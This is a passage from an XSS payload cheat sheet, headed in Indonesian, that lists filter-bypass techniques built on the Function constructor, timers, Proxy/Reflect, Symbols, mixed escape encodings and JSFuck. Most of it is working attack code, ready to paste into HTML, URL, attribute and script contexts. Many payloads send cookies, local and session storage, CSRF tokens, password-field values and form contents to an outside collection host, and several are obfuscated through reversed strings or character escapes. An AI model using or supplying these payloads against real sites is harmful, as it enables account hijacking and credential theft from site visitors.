[][props[0]][props[1]]('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Multiple property access patterns
[].map.constructor('fetch("//kiwoyo.requestcatcher.com/m?c="+document.cookie)')();
[]['find']['constructor']('fetch("//kiwoyo.requestcatcher.com/f?c="+document.cookie)')();
[].reduce.constructor('fetch("//kiwoyo.requestcatcher.com/r?c="+document.cookie)')();
```

---

## 9. Indirect Evaluation Methods (setTimeout/setInterval)

### Teknik: Menggunakan timer functions

#### Basic Usage
```javascript
// setTimeout string eval
setTimeout('alert(1)')
setTimeout(`alert(document.domain)`)

// setInterval
setInterval('alert(1)',100)

// Via constructor
[]['filter']['constructor']('return setTimeout')()('alert(1)',0)
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="setTimeout('alert(1)')">

<!-- SVG -->
<svg onload="setTimeout(`alert(document.domain)`)">

<!-- Input -->
<input autofocus onfocus="setInterval('alert(1)',100)">

<!-- Button -->
<button onclick="setTimeout('alert(origin)',0)">Click</button>

<!-- Body -->
<body onload="[]['filter']['constructor']('return setTimeout')()('alert(1)',0)">

<!-- Anchor -->
<a href="javascript:setTimeout('alert(1)')">Link</a>

<!-- Div -->
<div onmouseover="setTimeout(`alert(document.cookie)`)">Hover</div>

<!-- Form -->
<form onsubmit="setTimeout('alert(1)');return false">

<!-- Video -->
<video onloadstart="setInterval('alert(1)',1000)">

<!-- Marquee -->
<marquee onstart="setTimeout('alert(document.domain)')">Scroll</marquee>
```

#### URL Context Examples
```html
javascript:setTimeout('alert(1)')
javascript:setTimeout(`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)
javascript://example.com/%0AsetInterval('alert(1)',100)//
javascript:void([]['filter']['constructor']('return setTimeout')()('alert(1)',0))
javascript:%0dsetTimeout('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)',0)
javascript:/**/setTimeout(`alert(document.domain)`)
```

#### Attribute Context Examples
```html
" autofocus onfocus="setTimeout('alert(1)')" x="
" onclick="setTimeout(`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)" x="
' onmouseover='setInterval("alert(1)",100)' x='
" onload="[]['filter']['constructor']('return setTimeout')()('alert(1)',0)" x="
' accesskey='x' onclick='setTimeout("alert(document.domain)")' x='
" onfocus="setTimeout('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))',0)" autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// setTimeout exfiltration
setTimeout('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)',0)

// setInterval with clearInterval
var id = setInterval(`
    fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie);
    clearInterval(id);
`,100)

// Via constructor chain
[]['map']['constructor']('return setTimeout')()(`
    fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain,
        localStorage: JSON.stringify(localStorage)
    })))
`,0)

// Multiple delayed requests
setTimeout(`
    fetch('//kiwoyo.requestcatcher.com/req1?c='+document.cookie);
    setTimeout(() => {
        fetch('//kiwoyo.requestcatcher.com/req2?s='+btoa(JSON.stringify(localStorage)));
    }, 500);
`,100)

// Interval-based monitoring
setInterval(`
    if(document.cookie) {
        fetch('//kiwoyo.requestcatcher.com/monitor?c='+document.cookie+'&t='+Date.now());
    }
`,5000)

// Delayed POST request
setTimeout(`
    fetch('//kiwoyo.requestcatcher.com/exfil', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            forms: Array.from(document.forms).map(f => ({
                action: f.action,
                method: f.method,
                elements: Array.from(f.elements).map(e => ({
                    name: e.name,
                    value: e.value,
                    type: e.type
                }))
            }))
        })
    })
`, 1000)
```

---

## 10. Error Object Constructor

### Teknik: Via Error stack trace

#### Basic Usage
```javascript
// Basic Error constructor
Error.constructor.constructor('alert(1)')()

// Via Error instance
(new Error).constructor.constructor('alert(document.domain)')()

// Chained
try{}catch(e){e.constructor.constructor('alert(1)')()}
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="Error.constructor.constructor('alert(1)')()">

<!-- SVG -->
<svg onload="(new Error).constructor.constructor('alert(document.domain)')()">

<!-- Input -->
<input autofocus onfocus="try{}catch(e){e.constructor.constructor('alert(1)')()}">

<!-- Button -->
<button onclick="Error.constructor.constructor('alert(origin)')()">Click</button>

<!-- Body -->
<body onload="(new Error).constructor.constructor('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:Error.constructor.constructor('alert(1)')()">Link</a>

<!-- Div -->
<div onmouseover="try{}catch(e){e.constructor.constructor('alert(1)')()}">Hover</div>

<!-- Form -->
<form onsubmit="Error.constructor.constructor('alert(1)')();return false">

<!-- Details -->
<details ontoggle="(new Error).constructor.constructor('alert(document.domain)')()">

<!-- Select -->
<select onchange="Error.constructor.constructor('alert(1)')()"><option>1</option></select>
```

#### URL Context Examples
```html
javascript:Error.constructor.constructor('alert(1)')()
javascript:(new Error).constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0Atry{}catch(e){e.constructor.constructor('alert(1)')()}//
javascript:void(Error.constructor.constructor('alert(document.domain)')())
javascript:%0d(new Error).constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/Error.constructor.constructor('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="Error.constructor.constructor('alert(1)')()" x="
" onclick="(new Error).constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='try{}catch(e){e.constructor.constructor("alert(1)")()}' x='
" onload="Error.constructor.constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='(new Error).constructor.constructor("alert(1)")()' x='
" onfocus="Error.constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Error-based exfiltration
Error.constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Via Error instance
(new Error).constructor.constructor(`
    fetch('//kiwoyo.requestcatcher.com/?data='+btoa(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain,
        url: location.href
    })))
`)()

// Try-catch exfiltration
try{}catch(e){
    e.constructor.constructor(`
        var payload = {
            cookie: document.cookie,
            localStorage: JSON.stringify(localStorage),
            error: e.message
        };
        fetch('//kiwoyo.requestcatcher.com/?leak='+encodeURIComponent(JSON.stringify(payload)));
    `)()
}

// Error with complete data
Error.constructor.constructor(`
    fetch('//kiwoyo.requestcatcher.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            tokens: {
                csrf: document.querySelector('[name=csrf_token]')?.value,
                session: sessionStorage.getItem('session')
            },
            forms: Array.from(document.forms).map(f => f.action)
        })
    })
`)()

// Multiple error catches
try {
    throw new Error('trigger');
} catch(e) {
    e.constructor.constructor(`
        fetch('//kiwoyo.requestcatcher.com/err1?c='+document.cookie);
        fetch('//kiwoyo.requestcatcher.com/err2?d='+document.domain);
    `)()
}

// Error with credentials exfiltration
(new Error).constructor.constructor(`
    var credentials = Array.from(document.querySelectorAll('input[type=password]')).map(i => ({
        name: i.name,
        value: i.value,
        form: i.form?.action
    }));
    fetch('//kiwoyo.requestcatcher.com/creds?data='+btoa(JSON.stringify(credentials)));
`)()
```

---

## 11. Generator & Iterator Methods

### Teknik: Modern JavaScript features

#### Basic Usage
```javascript
// Generator function
(function*(){}).constructor('alert(1)')()

// Async function
(async function(){}).constructor('alert(1)')()

// Async generator
(async function*(){}).constructor('alert(document.cookie)')()
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="(function*(){}).constructor('alert(1)')()">

<!-- SVG -->
<svg onload="(async function(){}).constructor('alert(document.domain)')()">

<!-- Input -->
<input autofocus onfocus="(async function*(){}).constructor('alert(1)')()">

<!-- Button -->
<button onclick="(function*(){}).constructor('alert(origin)')()">Click</button>

<!-- Body -->
<body onload="(async function(){}).constructor('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:(function*(){}).constructor('alert(1)')()">Link</a>

<!-- Div -->
<div onmouseover="(async function*(){}).constructor('alert(1)')()">Hover</div>

<!-- Form -->
<form onsubmit="(function*(){}).constructor('alert(1)')();return false">

<!-- Video -->
<video onloadstart="(async function(){}).constructor('alert(document.domain)')()">

<!-- Canvas -->
<canvas onclick="(function*(){}).constructor('alert(1)')()">
```

#### URL Context Examples
```html
javascript:(function*(){}).constructor('alert(1)')()
javascript:(async function(){}).constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0A(async function*(){}).constructor('alert(1)')()//
javascript:void((function*(){}).constructor('alert(document.domain)')())
javascript:%0d(async function(){}).constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/(function*(){}).constructor('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="(function*(){}).constructor('alert(1)')()" x="
" onclick="(async function(){}).constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='(async function*(){}).constructor("alert(1)")()' x='
" onload="(function*(){}).constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='(async function(){}).constructor("alert(1)")()' x='
" onfocus="(async function(){}).constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```

#### Advanced: Data Exfiltration
```javascript
// Generator exfiltration
(function*(){}).constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Async function steal
(async function(){}).constructor(`
    await fetch('//kiwoyo.requestcatcher.com/?data='+btoa(document.cookie))
`)()

// Async generator complete
(async function*(){}).constructor(`
    const data = {
        cookie: document.cookie,
        domain: document.domain,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: location.href
    };
    await fetch('//kiwoyo.requestcatcher.com/?leak='+encodeURIComponent(JSON.stringify(data)));
`)()

// Multiple async requests
(async function(){}).constructor(`
    await fetch('//kiwoyo.requestcatcher.com/step1?c='+document.cookie);
    await fetch('//kiwoyo.requestcatcher.com/step2?s='+btoa(JSON.stringify(localStorage)));
    await fetch('//kiwoyo.requestcatcher.com/step3?u='+location.href);
`)()

// Async with error handling
(async function(){}).constructor(`
    try {
        const response = await fetch('//kiwoyo.requestcatcher.com/exfil', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                cookie: document.cookie,
                forms: Array.from(document.forms).map(f => ({
                    action: f.action,
                    method: f.method
                }))
            })
        });
        console.log('Exfiltrated');
    } catch(e) {
        console.error(e);
    }
`)()

// Generator with yield
(function*(){}).constructor(`
    function* exfil() {
        yield fetch('//kiwoyo.requestcatcher.com/gen1?c='+document.cookie);
        yield fetch('//kiwoyo.requestcatcher.com/gen2?d='+document.domain);
    }
    var gen = exfil();
    gen.next();
    gen.next();
`)()
```

---

## 12. Proxy & Reflect API

### Teknik: Meta-programming

#### Basic Usage
```javascript
// Via Reflect
Reflect.construct(Function,['alert(1)'])()

// Proxy trap
new Proxy({},{get:()=>alert})[0](1)

// Complex chain
Reflect.get([],'map').constructor('alert(1)')()
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="Reflect.construct(Function,['alert(1)'])()">

<!-- SVG -->
<svg onload="new Proxy({},{get:()=>alert})[0](1)">

<!-- Input -->
<input autofocus onfocus="Reflect.get([],'map').constructor('alert(1)')()">

<!-- Button -->
<button onclick="Reflect.construct(Function,['alert(document.domain)'])()">Click</button>

<!-- Body -->
<body onload="Reflect.get([],'filter').constructor('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:Reflect.construct(Function,['alert(1)'])()">Link</a>

<!-- Div -->
<div onmouseover="new Proxy({},{get:()=>alert})[0](document.domain)">Hover</div>

<!-- Form -->
<form onsubmit="Reflect.get([],'find').constructor('alert(1)')();return false">

<!-- Details -->
<details ontoggle="Reflect.construct(Function,['alert(origin)'])()">

<!-- Select -->
<select onchange="Reflect.get([],'reduce').constructor('alert(1)')()"><option>1</option></select>
```

#### URL Context Examples
```html
javascript:Reflect.construct(Function,['alert(1)'])()
javascript:Reflect.get([],'map').constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0Anew Proxy({},{get:()=>alert})[0](1)//
javascript:void(Reflect.construct(Function,['alert(document.domain)'])())
javascript:%0dReflect.get([],'filter').constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/Reflect.construct(Function,['alert(1)'])()
```

#### Attribute Context Examples
```html
" autofocus onfocus="Reflect.construct(Function,['alert(1)'])()" x="
" onclick="Reflect.get([],'map').constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='new Proxy({},{get:()=>alert})[0](1)' x='
" onload="Reflect.get([],'filter').constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='Reflect.construct(Function,["alert(1)"])()' x='
" onfocus="Reflect.get([],'map').constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Reflect exfiltration
Reflect.construct(Function,['fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)'])()

// Proxy-based exfiltration
new Proxy({}, {
    get: function() {
        fetch('//kiwoyo.requestcatcher.com/?data='+btoa(document.cookie));
        return alert;
    }
})[0](1)

// Reflect.get exfiltration
Reflect.get([],'map').constructor(`
    fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain,
        url: location.href
    })))
`)()

// Complex Reflect chain
Reflect.construct(
    Reflect.get([],'filter').constructor,
    [`
        var payload = {
            cookie: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };
        fetch('//kiwoyo.requestcatcher.com/?data='+encodeURIComponent(JSON.stringify(payload)));
    `]
)()

// Proxy with handler
var handler = {
    get: function(target, prop) {
        fetch('//kiwoyo.requestcatcher.com/proxy?c='+document.cookie);
        return Function;
    }
};
new Proxy({}, handler).anything('alert(1)')()

// Reflect with POST
Reflect.get([],'forEach').constructor(`
    fetch('//kiwoyo.requestcatcher.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            inputs: Array.from(document.querySelectorAll('input')).map(i => ({
                name: i.name,
                value: i.value
            }))
        })
    })
`)()
```

---

## 13. Symbol & Well-Known Symbols

### Teknik: Menggunakan Symbols

#### Basic Usage
```javascript
// Symbol.constructor
Symbol()[Symbol.toStringTag].constructor.constructor('alert(1)')()

// Via Symbol properties
(Symbol()).constructor.constructor('alert(document.domain)')()
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="Symbol()[Symbol.toStringTag].constructor.constructor('alert(1)')()">

<!-- SVG -->
<svg onload="(Symbol()).constructor.constructor('alert(document.domain)')()">

<!-- Input -->
<input autofocus onfocus="Symbol()[Symbol.toStringTag].constructor.constructor('alert(1)')()">

<!-- Button -->
<button onclick="(Symbol()).constructor.constructor('alert(origin)')()">Click</button>

<!-- Body -->
<body onload="Symbol().constructor.constructor('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:Symbol().constructor.constructor('alert(1)')()">Link</a>

<!-- Div -->
<div onmouseover="(Symbol()).constructor.constructor('alert(1)')()">Hover</div>

<!-- Form -->
<form onsubmit="Symbol().constructor.constructor('alert(1)')();return false">

<!-- Video -->
<video onloadstart="Symbol()[Symbol.toStringTag].constructor.constructor('alert(1)')()">

<!-- Canvas -->
<canvas onclick="(Symbol()).constructor.constructor('alert(document.domain)')()">
```

#### URL Context Examples
```html
javascript:Symbol().constructor.constructor('alert(1)')()
javascript:Symbol()[Symbol.toStringTag].constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0A(Symbol()).constructor.constructor('alert(1)')()//
javascript:void(Symbol().constructor.constructor('alert(document.domain)')())
javascript:%0dSymbol()[Symbol.toStringTag].constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/Symbol().constructor.constructor('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="Symbol().constructor.constructor('alert(1)')()" x="
" onclick="Symbol()[Symbol.toStringTag].constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='(Symbol()).constructor.constructor("alert(1)")()' x='
" onload="Symbol().constructor.constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='Symbol().constructor.constructor("alert(1)")()' x='
" onfocus="Symbol().constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Symbol exfiltration
Symbol().constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Via Symbol.toStringTag
Symbol()[Symbol.toStringTag].constructor.constructor(`
    fetch('//kiwoyo.requestcatcher.com/?data='+btoa(document.cookie))
`)()

// Complete Symbol exfiltration
(Symbol()).constructor.constructor(`
    var payload = {
        cookie: document.cookie,
        domain: document.domain,
        localStorage: JSON.stringify(localStorage),
        url: location.href
    };
    fetch('//kiwoyo.requestcatcher.com/?leak='+encodeURIComponent(JSON.stringify(payload)));
`)()

// Multiple Symbol requests
Symbol().constructor.constructor(`
    fetch('//kiwoyo.requestcatcher.com/sym1?c='+document.cookie);
    fetch('//kiwoyo.requestcatcher.com/sym2?d='+document.domain);
    fetch('//kiwoyo.requestcatcher.com/sym3?u='+location.href);
`)()

// Symbol with POST
Symbol()[Symbol.toStringTag].constructor.constructor(`
    fetch('//kiwoyo.requestcatcher.com/exfil', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            tokens: Object.keys(localStorage).reduce((acc, key) => {
                if(key.match(/token|jwt|auth/i)) {
                    acc[key] = localStorage.getItem(key);
                }
                return acc;
            }, {})
        })
    })
`)()

// Symbol iterator exfiltration
(Symbol.iterator).constructor.constructor(`
    var data = {
        cookie: document.cookie,
        forms: Array.from(document.forms).map(f => ({
            action: f.action,
            inputs: [...f.elements].map(e => ({name: e.name, value: e.value}))
        }))
    };
    fetch('//kiwoyo.requestcatcher.com/iter?data='+btoa(JSON.stringify(data)));
`)()
```

---

## 14. Encoding Kombinasi (Ultimate Obfuscation)

### Teknik: Mix semua encoding

#### Basic Usage
```javascript
// Octal + Unicode + Hex
[]['\146\x69\u006c\x74\145\162']['\x63\u006f\156\x73\164\x72\x75\x63\164\x6f\x72']('\x61\u006c\145\x72\164(1)')()

// HTML entities (dalam HTML context)
<img src=x onerror="[]['\146\x69\154\x74\145\x72']['\x63\x6f\x6e\x73\x74\x72\165\x63\x74\157\x72']('\x61\x6c\145\x72\164(1)')()">

// URL encoding (dalam URL context)
javascript:[]%5b'filter'%5d%5b'constructor'%5d('alert(1)')()
```

#### HTML Context Examples
```html
<!-- Image mixed encoding -->
<img src=x onerror="[]['\146\x69\u006c\164\145\x72']['\x63\157\156\x73\164\x72\165\143\164\x6f\162']('\x61\154\x65\x72\164(1)')()">

<!-- SVG octal+hex -->
<svg onload="[]['\146\x69\154\164\x65\162']['\x63\x6f\156\x73\164\162\x75\143\x74\x6f\x72']('\x61\x6c\145\x72\164(1)')()">

<!-- Input unicode+octal -->
<input autofocus onfocus="[][\u0066\151\154\164\145\162][\u0063\157\156\163\164\162\165\143\164\157\162]('\u0061\154\145\x72\x74(1)')()">

<!-- Button hex+unicode -->
<button onclick="[]['\x66\u0069\x6c\u0074\x65\u0072']['\x63\u006f\x6e\u0073\x74\u0072\x75\u0063\x74\u006f\x72']('\x61\u006c\x65\u0072\x74(1)')()">Click</button>

<!-- Body all encoding -->
<body onload="[\u0027\146\x69\154\x74\145\162\u0027][\u0027\143\x6f\x6e\x73\x74\162\x75\143\x74\x6f\162\u0027]('\x61\154\145\162\x74(1)')()">

<!-- Anchor -->
<a href="javascript:[]['\146\x69\u006c\x74\145\162']['\x63\u006f\156\x73\164\x72\x75\143\164\x6f\x72']('\x61\u006c\x65\162\164(1)')()">Link</a>

<!-- Div -->
<div onmouseover="[]['\146\151\x6c\u0074\145\x72']['\143\x6f\156\x73\x74\x72\165\x63\x74\x6f\162']('\141\x6c\x65\162\x74(1)')()">Hover</div>

<!-- Form -->
<form onsubmit="[]['\146\x69\u006c\164\x65\162']['\x63\157\x6e\x73\164\x72\165\143\164\x6f\162']('\x61\154\145\x72\164(1)')();return false">
```

#### URL Context Examples
```html
javascript://example.com/%0A[][\u0027\146\x69\154\x74\145\162\u0027][\u0027\143\x6f\x6e\x73\x74\162\x75\143\x74\x6f\162\u0027]('\x61\154\145\162\x74(1)')()//
javascript:[]['\146\x69\u006c\164\145\162']['\x63\u006f\156\x73\164\x72\165\143\164\x6f\162']('\x61\u006c\145\x72\164(1)')()
javascript:[]['\146\x69\154\x74\145\162']['\x63\x6f\x6e\x73\164\x72\165\x63\x74\157\x72']('\x66\u0065\164\x63\150("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:void([]['\146\151\x6c\u0074\145\x72']['\143\x6f\156\x73\x74\x72\165\x63\x74\x6f\162']('\141\x6c\x65\162\x74(1)')())
javascript:%0d[]['\x66\151\u006c\164\x65\162']['\143\157\x6e\x73\164\162\165\143\x74\x6f\162']('\x66\145\x74\143\x68("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/[]['\146\x69\u006c\x74\145\162']['\x63\157\156\x73\164\x72\165\143\164\x6f\162']('\x61\154\145\x72\164(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="Symbol().constructor.constructor('alert(1)')()" x="
" onclick="Symbol()[Symbol.toStringTag].constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='(Symbol()).constructor.constructor("alert(1)")()' x='
" onload="Symbol().constructor.constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='Symbol().constructor.constructor("alert(1)")()' x='
" onfocus="Symbol().constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Mixed encoding exfiltration
[]['\146\x69\u006c\164\145\162']['\x63\u006f\156\x73\164\x72\165\143\164\x6f\162']('\x66\u0065\164\x63\150("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Complete obfuscation
[]['\146\x69\u006c\x74\145\x72']['\143\x6f\x6e\163\x74\x72\165\x63\164\157\x72'](`
    \u0066\145\164\143\x68('//kiwoyo.requestcatcher.com/?leak='+\142\164\x6f\x61(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain
    })))
`)()

// Hex+Octal+Unicode full payload
[]['\x66\151\u006c\164\145\x72']['\143\x6f\x6e\x73\164\162\x75\x63\164\x6f\162'](`
    var payload = {
        \x63\157\x6f\153\x69\145: document.cookie,
        \144\x6f\155\x61\151\156: document.domain,
        \x75\162\154: location.href,
        \x6c\x6f\143\141\154\123\x74\x6f\x72\141\x67\x65: JSON.stringify(localStorage)
    };
    \u0066\145\164\x63\x68('//kiwoyo.requestcatcher.com/?data='+encodeURIComponent(JSON.stringify(payload)));
`)()

// URL encoded in attribute
<a href="javascript:[]%5b%27%66%69%6c%74%65%72%27%5d%5b%27%63%6f%6e%73%74%72%75%63%74%6f%72%27%5d%28%27fetch%28%22//kiwoyo.requestcatcher.com/?c=%22+document.cookie%29%27%29%28%29">

// POST with mixed encoding
[]['\146\x69\u006c\x74\145\162']['\x63\157\156\x73\164\x72\x75\143\x74\x6f\162'](`
    \x66\145\164\143\x68('//kiwoyo.requestcatcher.com/steal', {
        \x6d\145\164\150\x6f\144: 'POST',
        \x68\145\x61\144\145\162\163: {'\x43\x6f\156\164\145\156\x74-\124\171\160\145': 'application/json'},
        \142\x6f\144\171: JSON.stringify({
            \143\x6f\x6f\153\151\145: document.cookie,
            \x74\x6f\153\x65\156\x73: Object.keys(localStorage).map(k => ({key: k, value: localStorage.getItem(k)}))
        })
    })
`)()
```

---

## 15. Context-Specific Bypasses

### Teknik: Berdasarkan context injection

#### HTML Attribute Context
```html
<input value="x" onmouseover="[]['map']['constructor']('alert(1)')()">
<body onload=[]['filter']['constructor']('\x61lert(1)')()>
<svg onload=[][['\x6d\x61\x70']].constructor.constructor`alert\x281\x29`()>
<a href="#" onclick="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)">
<img src=x onerror="(1)['constructor']['constructor']('alert(1)')()">
<div data-x="y" onmouseover="/./['constructor']['constructor']('alert(1)')()">
<button accesskey="x" onclick="Error.constructor.constructor('alert(1)')()">
<form action=x onsubmit="setTimeout('alert(1)');return false">
<details ontoggle="(function*(){}).constructor('alert(1)')()">
<select onchange="Reflect.construct(Function,['alert(1)'])()"><option>1</option></select>
```

#### JavaScript String Context
```javascript
';[]['\x66ilter']['\x63onstructor']('\x61lert(1)')();//
";[]['map']['constructor']('alert(1)')()//
`;[]['find']['constructor'](`alert(1)`)()//
\';x=\'hctef\'.split(\'\').reverse().join(\'\');self[x](\'//kiwoyo.requestcatcher.com/?c=\'+document.cookie);//
";(1)['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()//
```

#### Script Tag Context
```html
</script><script>[]['filter']['constructor']('alert(1)')()</script>
<script>/**/[]['map']['constructor']('alert(1)')()</script>
<script><!--
[]['find']['constructor']('alert(1)')()
//--></script>
<script>
x='hctef'.split('').reverse().join('');
self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie);
</script>
```
#### URL Context Examples
```html
javascript:with([]){filter.constructor('alert(1)')()}
javascript:with([]){map.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()}
javascript://example.com/%0Awith([]){find.constructor('alert(1)')()}//
javascript:void(with([]){reduce.constructor('alert(document.domain)')()})
javascript:%0dwith([]){forEach.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()}
javascript:/**/with([]){filter.constructor('alert(1)')()}
```

#### Attribute Context Examples
```html
" autofocus onfocus="with([]){filter.constructor('alert(1)')()}" x="
" onclick="with([]){map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()}" x="
' onmouseover='with([]){find.constructor("alert(1)")()}' x='
" onload="with([]){reduce.constructor('alert(document.domain)')()}" x="
' accesskey='x' onclick='with([]){forEach.constructor("alert(1)")()}' x='
" onfocus="with([]){map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')()}" autofocus x="
```

#### Advanced: Data Exfiltration
```javascript
// In attribute context
<img src=x onerror="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)">

// In JS string context
var x = "escaped';[]['map']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')();//";

// In script tag
<script>
var data = {
    cookie: document.cookie,
    domain: document.domain,
    forms: Array.from(document.forms).map(f => ({
        action: f.action,
        inputs: Array.from(f.elements).map(e => ({name: e.name, value: e.value}))
    }))
};
[]['filter']['constructor']('fetch("//kiwoyo.requestcatcher.com/?leak="+btoa(JSON.stringify(data)))')();
</script>

// In event handler with reversal
<body onload="
    f='hctef'.split('').reverse().join('');
    b='aotb'.split('').reverse().join('');
    payload = {
        cookie: document.cookie,
        storage: JSON.stringify(localStorage)
    };
    self[f]('//kiwoyo.requestcatcher.com/?data='+window[b](JSON.stringify(payload)));
">

// Polyglot context
/*--></title></style></script>
<script>
x='hctef'.split('').reverse().join('');
self[x]('//kiwoyo.requestcatcher.com/polyglot?c='+document.cookie);
</script><!--*/
```

---

## 16. JSFuck-Style Minimal Character Set

### Teknik: Hanya dengan `[]()!+`

#### Basic Usage
```javascript
// alert(1) menggunakan JSFuck style
(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]

// Konsep: Menghasilkan "alert" dari manipulasi array/boolean
```

#### HTML Context Examples
```html
<!-- Image (simplified for readability) -->
<img src=x onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]">

<!-- SVG -->
<svg onload="([![]]+[][[]])[+!+[]+[+[]]]">

<!-- Input -->
<input autofocus onfocus="(![]+[])[!+[]+!+[]+!+[]]">

<!-- Note: Full JSFuck payloads sangat panjang, contoh di atas hanya konsep -->

<!-- Button with constructor access -->
<button onclick="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]('alert(1)')()">
```
#### URL Context Examples
```html
javascript:(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]
javascript:[][(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]][([][(![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]]('alert(1)')()
javascript://example.com/%0A(![]+[])[+!+[]]//
javascript:void((![]+[])[!+[]+!+[]])
javascript:%0d([![]]+[][[]])[+!+[]+[+[]]]
javascript:/**/(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]
```

#### Attribute Context Examples
```html
